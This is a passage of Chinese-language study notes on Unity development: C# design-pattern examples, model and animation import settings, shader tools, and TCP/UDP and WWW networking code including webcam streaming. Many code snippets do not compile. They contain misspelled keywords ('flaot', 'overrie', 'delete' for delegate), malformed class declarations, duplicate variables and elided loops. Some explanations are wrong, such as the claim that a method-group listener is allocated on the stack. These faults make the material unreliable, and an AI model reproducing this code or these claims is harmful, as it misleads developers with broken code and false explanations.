<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">using</span> UnityEngine.UI;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.Events;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UseFactory</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    Factory factory;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        factory = <span class="keyword">new</span> Factory();</span><br><span class="line">        Button = btn = transform.GetComponent&lt;Button&gt;();</span><br><span class="line">        <span class="comment">// 传入回调函数</span></span><br><span class="line">        <span class="comment">// 分配的空间在堆上</span></span><br><span class="line">        btn.onClick.AddListener(<span class="keyword">new</span> UnityAciton(BtnOnClick));</span><br><span class="line">        <span class="comment">// 分配的空间在栈上</span></span><br><span class="line">        btn.onClick.AddListener(BtnOnClick);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">BtnOnClick</span>()</span>&#123;</span><br><span class="line">        <span class="comment">// 按钮事件</span></span><br><span class="line">        Debug.Log(<span class="string">&quot;Btn Clicked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Master</span>&#123;</span><br><span class="line">    Worker worker;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CallWorker</span>()</span>&#123;</span><br><span class="line">        worker.Task();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnWorkerCall</span>()</span>&#123;</span><br><span class="line">        Debug.Log(<span class="string">&quot;Work Finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Worker</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> delete <span class="keyword">void</span> <span class="title">TaskPointer</span>()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> TaskPointer taskPointer;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Task</span>()</span>&#123;</span><br><span class="line">        taskPointer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UseDelegate</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        Master master = <span class="keyword">new</span> Master();</span><br><span class="line">        Worker worker = <span class="keyword">new</span> Worker();</span><br><span class="line">        <span class="comment">// Master 调用 Worker</span></span><br><span class="line">        master.CallWorker();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Worker 调用 Master</span></span><br><span class="line">        worker.taskPointer += master.OnWorkerCall;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="策略者模式"><a href="#策略者模式" class="headerlink" title="策略者模式"></a>策略者模式</h4><p>决策制可以根据不同对象的输入得到不同的结果。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AbsBase</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> flaot pay;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">CalculateTex</span>()</span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AbsPerson</span>: <span class="title">AbsBase</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">CalculateTex</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">base</span>.CalculateTex();</span><br><span class="line">        pay *= <span class="number">0.08f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AbsCompany</span>: <span class="title">AbsBase</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> overrie <span class="keyword">void</span> <span class="title">CalculateTex</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">base</span>.CalculateTex();</span><br><span class="line">        pay *= <span class="number">0.12f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> TestAbstrator: MonoBehaviour&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CalculateTex</span>(<span class="params">AbsBase bs</span>)</span>&#123;</span><br><span class="line">        bs.CalculateTex();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据不同的对象，自动选择不同的计算方法，得到不同的结果</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        AbsPerson person = <span class="keyword">new</span> AbsPerson();</span><br><span class="line">        CalculateTex(person);</span><br><span class="line"></span><br><span class="line">        AbsCompany company = <span class="keyword">new</span> AbsCompany();</span><br><span class="line">        CalculateTex(company);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="建造者模式"><a href="#建造者模式" class="headerlink" title="建造者模式"></a>建造者模式</h4><p>将一个大的东西拆分成小的东西。</p>
<p>例如：MVC框架。</p>
<p>由顶部的UI Manager管理下层的对象。对模块的管理，用单例模式。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不对外提供Manager，Worker，只提供Master</span></span><br><span class="line"><span class="comment">// Master是单例模式</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Master</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Master instance;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Master Instance&#123;</span><br><span class="line">        <span class="keyword">get</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(instance == <span class="literal">null</span>)&#123;</span><br><span class="line">                instance = <span class="keyword">new</span> Master();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> instance;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CreateTask</span>()</span>&#123;</span><br><span class="line">        Manager manager = <span class="keyword">new</span> Manager();</span><br><span class="line">        manager.ResolveTask();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Manager</span>()</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ResolveTask</span>()</span>&#123;</span><br><span class="line">        Worker worker = <span class="keyword">new</span> Worker();</span><br><span class="line">        worker.ExecuteTask();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Worker</span>()</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ExecuteTask</span>()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h4><p>防止类直接互相影响。解决耦合性问题。</p>
<p>例如：怪物和玩家之间的互相攻击。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MiddleBase</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> hp;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">reduce</span>(<span class="params"><span class="built_in">float</span> bias</span>)</span>&#123;</span><br><span class="line">        hp -= bias;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MiddleFirst</span>: <span class="title">MiddleBase</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">reduce</span>(<span class="params"><span class="built_in">float</span> bias</span>)</span>&#123;</span><br><span class="line">        hp -= bias * <span class="number">1.3f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MiddleSecond</span>: <span class="title">MiddleBase</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">reduce</span>(<span class="params"><span class="built_in">float</span> bias</span>)</span>&#123;</span><br><span class="line">            hp -= bias * <span class="number">0.7f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CalculateHP</span>(<span class="params">MiddleBase first, MiddleBase second</span>)</span>&#123;</span><br><span class="line">        first.reduce(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Update</span>()</span>&#123;</span><br><span class="line">        MiddleFirst first = <span class="keyword">new</span> MiddleFirst();</span><br><span class="line">        MiddleSecond second = <span class="keyword">new</span> MiddleSecond();</span><br><span class="line"></span><br><span class="line">        CalculateHP(first, second);</span><br><span class="line">        CalculateHP(second, first);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h4><p>将各种不同类型的东西放在一起，聚合，形成特定的功能。</p>
<p>例如：红绿灯，日期时间控件。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UI</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> GameObject Red;</span><br><span class="line">    <span class="keyword">private</span> GameObject Blue;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">bool</span> stateRed = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        Button btn = GetComponent&lt;Button&gt;();</span><br><span class="line">        btn.onClick.AddListener(OnClick);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnClick</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stateRed)&#123;</span><br><span class="line">            Red.SetActive(<span class="literal">true</span>);</span><br><span class="line">            Blue.SetActive(<span class="literal">false</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            Red.SetActive(<span class="literal">false</span>);</span><br><span class="line">            Blue.SetActive(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        stateRed = !stateRed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h4><p>将相同类型的东西组合一起，形成特有功能。</p>
<p>例如：构成一辆车的轮胎，框架，发动机等。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CarBase</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Forward</span>()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Backword</span>()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Wheel</span>: <span class="title">CarBase</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Forward</span>()</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Backword</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Engine</span>: <span class="title">CarBase</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Forward</span>()</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Backword</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    List&lt;CarBase&gt; car;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        car = <span class="keyword">new</span> List&lt;CarBase&gt;();</span><br><span class="line">        car.Add(<span class="keyword">new</span> Engine());</span><br><span class="line">        car.Add(<span class="keyword">new</span> Wheel());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; car.Count; i++)&#123;</span><br><span class="line">            car[i].Forward();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="状态者模式"><a href="#状态者模式" class="headerlink" title="状态者模式"></a>状态者模式</h4><p>FSM 有限状态机或命令者模式。</p>
<p>可以用来制作动画。</p>
<p>模型文件：<br>Obj 只有模型（顶点，法线，切线），没有动画。<br>Fbx 带动画和模型<br>Dae 只有模型</p>
<p>这里用Fbx文件。</p>
<p>模型系统：<br>Scale Factor：缩放因子，Unity以米为单位，因此需要缩放。<br>Mesh Compression<br>Read Write Enable<br>Optimize Mesh：优化，采用四边形<br>Import BlendShapes</p>
<p>Normals：法线，Import，模型自带法线<br>Tangents：切线（切线：右向量，副切线：前向量），Import，自带</p>
<p>Materials：导入材质</p>
<p>动画系统：<br>关节动画：骨骼（子级在父级的坐标 Transform）动画。</p>
<ul>
<li>MeshFilter 筛选定点</li>
<li>MeshRender 渲染选出的的定点<br>蒙皮动画：皮肤动画。</li>
<li>SkinMeshRender 将模型传递给GPU<br>顶点动画：对模型的顶点做动画。</li>
</ul>
<p>Rig<br>动画类型：</p>
<ul>
<li>Legacy 关节动画，通过代码控制</li>
<li>Generic 状态机动画，非人形动画，动画不能通用</li>
<li>Humanoid 状态机动画，人形动画，可以复用动画<ul>
<li>OrcAvatar：保存人物动画的映射</li>
</ul>
</li>
</ul>
<p>一般模型，动画分开两个文件保存。</p>
<p>动画文件，一般都是原地动画，也有带位移的动画。</p>
<p>动画事件通过代码实现。</p>
<p>fbx和meta文件一起放入目录。</p>
<p>控制器代码：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">OrcCtrl</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    CharacterController charCtrl;</span><br><span class="line">    Animator animator;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">OnAnimatorMove</span>()</span>&#123;</span><br><span class="line">        <span class="comment">// 有重力，参数为动画片段的位移</span></span><br><span class="line">        charCtrl.SimpleMove(animator.deltaPosition); </span><br><span class="line">        charCtrl.SimpleMove(animator.deltaRotation); </span><br><span class="line">        charCtrl.SimpleMove(animator.rootPosition); </span><br><span class="line">        <span class="comment">// 没有重力，参数为向前移动</span></span><br><span class="line">        charCtrl.Move(Vector3.forward);       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        charCtrl = GetComponent&lt;CharacterController&gt;();</span><br><span class="line">        animator = GetComponent&lt;Animator&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Shader"><a href="#Shader" class="headerlink" title="Shader"></a>Shader</h2><h3 id="开发语言和工具"><a href="#开发语言和工具" class="headerlink" title="开发语言和工具"></a>开发语言和工具</h3><p>开发语言：<br>HLSL：专用于Direct3D和XNA。<br>Cg：C for Graphics，由NVIDIA开发<br>GLSL：用于OpenGL<br>ShaderLab：Unity使用，类似CgFX和Direct3D的效果框架。</p>
<p>开发工具：<br>FX Composer<br>Render Monkey<br>MonoDevelop：Unity使用<br>第三方IDE</p>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>UDP：传输顺序不一定。<br>RUDP：保证顺序一定的UDP，发送数据后等待却认。<br>TCP：消耗资源较大，有拥塞控制。</p>
<p>MMORPG：多人在线游戏，状态同步，实时同步状态（发送状态而不是位置）到所有客户端。网络延迟时，每3-5秒同步一次。网络掉线时，重连，可以用Unity 的API判断。<br>Moba：采用RUDP，使用网络帧同步，50ms - 60ms 一次。使用Lock Step技术，服务器等待所有结果，一台机器卡，所有机器都卡。使用乐观锁，不等待客户端，只下发。<br>ARPG：角色扮演<br>PVP：对战<br>PVE：打怪<br>SLG：策略游戏</p>
<h3 id="创建连接"><a href="#创建连接" class="headerlink" title="创建连接"></a>创建连接</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">    Socket server = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">    IPEndPoint endPoint = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(<span class="string">&quot;192.168.1.1&quot;</span>), <span class="number">8000</span>);</span><br><span class="line">    IPEndPoint endPoint = <span class="keyword">new</span> IPEndPoint(IPAddress.Any, <span class="number">8000</span>);</span><br><span class="line">    server.Bind(endPoint);</span><br><span class="line">    Thread thread = <span class="keyword">new</span> Thread(() =&gt; &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                server.BeginAccept((IAsyncResult callback) =&gt; &#123;</span><br><span class="line">                    <span class="comment">// 有连接 会回调这里</span></span><br><span class="line">                    Socket client = server.EndAccept(callback);</span><br><span class="line">                &#125;, <span class="literal">null</span>); <span class="comment">// 异步，参数</span></span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                Debug.Log(e.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            Thread.Sleep(<span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    thread.Start();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 传输数据，转换二进制流或JSON</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Use</span>()</span>&#123;</span><br><span class="line">    WebCamDevice cam = WebCamTexture.devices[<span class="number">0</span>];</span><br><span class="line">    WebCamTexture tex = <span class="keyword">new</span> WebCamTexture(cam.name, <span class="number">300</span>, <span class="number">400</span>, <span class="number">10</span>); <span class="comment">// 尺寸，帧率</span></span><br><span class="line">    transform.GetComponent&lt;Renderer&gt;().material.mainTexture = tex;</span><br><span class="line">    tex.Play();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">byte</span>[] <span class="title">GetBytes</span>()</span>&#123;</span><br><span class="line">    Texture2D raw = <span class="keyword">new</span> Texture2D(<span class="number">300</span>, <span class="number">400</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i...)&#123;</span><br><span class="line">        <span class="keyword">for</span>()&#123;</span><br><span class="line">            Color c = tex.GetPixel(j, i);</span><br><span class="line">            raw.SetPixel(j, i, c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> raw.EncodeToJPG();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Send</span>()</span>&#123;</span><br><span class="line">    UDPSocket send = <span class="keyword">new</span> UDPSocket(port, size, <span class="keyword">new</span> UDPSocket.RecvDelegate(()=&gt;&#123;</span><br><span class="line">        send.SendBytes(GetBytes(), <span class="string">&quot;ip&quot;</span>);</span><br><span class="line">    &#125;));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// API</span></span><br><span class="line">Buffer.BlockCopy();</span><br><span class="line"><span class="comment">// 线程传数据</span></span><br><span class="line"><span class="comment">// 主 到 辅：主线程锁住，变换</span></span><br><span class="line"><span class="comment">// 辅 到 主：recvBuffer锁住，接收数据</span></span><br></pre></td></tr></table></figure>

<p>接收后更新M层数据，在主线程。</p>
<h2 id="示例模块"><a href="#示例模块" class="headerlink" title="示例模块"></a>示例模块</h2><p>一个游戏一般包含：</p>
<ul>
<li>Audio 音效</li>
<li>WWW 网络链接&#x2F;本地资源文件</li>
<li>DB 数据库</li>
<li>Effect 特效</li>
<li>UI 用户界面</li>
<li>Animation 动画（FSM 有限自动机）<ul>
<li>Player 玩家</li>
<li>NPC 机器人</li>
</ul>
</li>
</ul>
<h3 id="网络传输模块"><a href="#网络传输模块" class="headerlink" title="网络传输模块"></a>网络传输模块</h3><p>例如进入游戏之后，先检查游戏更新。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TestHttp</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="comment">// GET 请求</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerator <span class="title">SendGet</span>(<span class="params"><span class="built_in">string</span> url</span>)</span>&#123;</span><br><span class="line">        WWW www = <span class="keyword">new</span> WWW(url);</span><br><span class="line">        <span class="comment">// 协程，将任务分片加载</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">return</span> www;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否下载错误</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">string</span>.IsNullOrEmpty(www.error))&#123;</span><br><span class="line">            <span class="comment">// 没有错误</span></span><br><span class="line">            Debug.Log(www.txt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// POST 请求</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerator <span class="title">SendPost</span>(<span class="params"><span class="built_in">string</span> url, WWWForm form</span>)</span>&#123;</span><br><span class="line">        WWW www = <span class="keyword">new</span> WWW(url, form);</span><br><span class="line">        <span class="comment">// 协程，将任务分片加载</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">return</span> www;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否下载错误</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">string</span>.IsNullOrEmpty(www.error))&#123;</span><br><span class="line">            <span class="comment">// 没有错误</span></span><br><span class="line">            Debug.Log(www.txt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下载本地文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerator <span class="title">DownloadLocalFile</span>(<span class="params"><span class="built_in">string</span> url</span>)</span>&#123;</span><br><span class="line">        WWW www = <span class="keyword">new</span> WWW(url, form);</span><br><span class="line">        <span class="comment">// 协程，将任务分片加载</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">return</span> www;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否下载错误</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">string</span>.IsNullOrEmpty(www.error))&#123;</span><br><span class="line">            <span class="comment">// 没有错误</span></span><br><span class="line">            Debug.Log(www.txt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">InitUrl</span>(<span class="params"><span class="built_in">string</span> url</span>)</span>&#123;</span><br><span class="line">        <span class="comment">// iOS: &quot;file://&quot;</span></span><br><span class="line">        <span class="comment">// Android: &quot;jar:file://&quot;</span></span><br><span class="line">        <span class="comment">// PC: &quot;file:///&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(Application.platform == RuntimePlatform.WindowsEditor</span><br><span class="line">        || Application.platform == RuntimePlatform.WindowsPlayer)&#123;</span><br><span class="line">            url = <span class="string">&quot;file:///&quot;</span> + url;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(Application.platform == RuntimePlatform.Android)&#123;</span><br><span class="line">            url = <span class="string">&quot;jar:file://&quot;</span> + url;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            url = <span class="string">&quot;file://&quot;</span> + url;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        <span class="built_in">string</span> url = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">// 启动协程</span></span><br><span class="line">        StartCoroutine(SendGet(url));</span><br><span class="line">        </span><br><span class="line">        WWWForm form = <span class="keyword">new</span> WWWForm();</span><br><span class="line">        form.AddField(<span class="string">&quot;arg&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        StartCoroutine(SendPost(url, form));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Application.dataPath: 应用路径/Asserts/，一般只读，访问工程，只在PC上</span></span><br><span class="line">        <span class="comment">// Application.persistentDataPath: 缓存路径，用文件系统可读可写</span></span><br><span class="line">        <span class="comment">//    Android：SD 卡</span></span><br><span class="line">        <span class="comment">//    iOS：Document</span></span><br><span class="line">        <span class="comment">//    Android：User/AppData/Local...</span></span><br><span class="line">        <span class="comment">// Application.streamingAssetsPath: 应用路径/Asserts/StreamingAsserts，该路径下所有文件会被打包到实机上（打包后的assets路径下，只能用www下载，不可写）</span></span><br><span class="line">        <span class="built_in">string</span> filepath = Application.dataPath + <span class="string">&quot;/filename.txt&quot;</span>;</span><br><span class="line">        StartCoroutine(DownloadLocalFile(InitUrl(filepath)))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>封装模块：</p>
<p>下载任务基类：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">WWWItem</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">BeginDownload</span>()</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">DownlaodFinish</span>(<span class="params">WWW www</span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">DownloadError</span>(<span class="params">WWWItem item</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">string</span> url;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Url&#123;</span><br><span class="line">        <span class="keyword">get</span> &#123;<span class="keyword">return</span> url;&#125;</span><br><span class="line">        <span class="keyword">set</span> &#123;url = <span class="keyword">value</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerator <span class="title">Download</span>()</span>&#123;</span><br><span class="line">        BeginDownload();</span><br><span class="line">        WWW www = <span class="keyword">new</span> WWW(Url);</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">return</span> www;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">string</span>.IsNullOrEmpty(www.error))&#123;</span><br><span class="line">            DownlaodFinish(www);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            DownloadError(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下载队列：</p>
